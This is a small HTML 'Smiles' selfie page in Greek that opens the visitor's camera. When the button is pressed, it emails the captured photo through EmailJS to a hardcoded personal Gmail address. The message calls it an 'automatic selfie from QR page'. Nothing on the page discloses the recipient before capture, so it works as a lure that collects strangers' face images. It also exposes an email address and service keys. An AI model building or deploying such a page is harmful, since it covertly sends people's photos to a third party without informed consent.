# George-
Smile app
<!DOCTYPE html>
<html lang="el">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ΧΑΜΌΓΕΛΑ</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fefefe;
    }
    h1 {
      font-size: 3rem;
      color: #e60000;
    }
    video, canvas {
      max-width: 100%;
      border-radius: 10px;
      border: 2px solid #ccc;
      margin: 10px 0;
    }
    button {
      background: #e60000;
      border: none;
      color: white;
      font-size: 1.2rem;
      padding: 1rem 2rem;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>ΧΑΜΌΓΕΛΑ</h1>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <button onclick="takeSnapshot()">📸 Τράβα Selfie</button>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script>
    emailjs.init("3Uk7TTVqiHQRoyR9y");

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        alert("Δεν μπόρεσα να ανοίξω την κάμερα: " + err);
      });

    function takeSnapshot() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL("image/jpeg");

      const templateParams = {
        to_email: "kokkinosmanoles083@gmail.com",
        message: "Αυτόματη selfie από QR page!",
        photo: dataURL
      };

      emailjs.send("service_hrlpdla", "template_3r3r04q", templateParams)
        .then(() => {
          alert("Η selfie στάλθηκε επιτυχώς!");
        })
        .catch(error => {
          alert("Αποτυχία αποστολής: " + JSON.stringify(error));
        });
    }
  </script>
</body>
</html>
